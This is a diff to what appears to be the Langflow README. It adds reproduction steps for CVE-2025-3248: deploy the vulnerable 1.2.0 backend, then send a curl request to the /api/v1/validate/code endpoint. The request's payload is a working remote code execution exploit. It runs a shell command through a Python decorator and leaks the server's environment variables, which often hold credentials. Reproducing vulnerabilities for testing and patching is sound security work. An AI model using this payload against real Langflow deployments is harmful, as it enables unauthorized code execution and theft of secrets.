@@ -1,5 +1,13 @@
 <!-- markdownlint-disable MD030 -->
 
+# CVE-2025-3248 reproduction
+
+To reproduce CVE-2025-3248 you must first modify `deploy/docker-compose.yml` to include a version `langflowai/langflow-backend:1.2.0`. Than just run `docker compose build` and `docker compose up -d`. Then just run 
+
+```bash
+curl -X POST -H 'Content-Type: application/json' http://localhost:80/api/v1/validate/code -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"env\\\"))\")\ndef foo():\n  pass"}'
+```
+
 ![Langflow logo](./docs/static/img/langflow-logo-color-black-solid.svg)
 
 
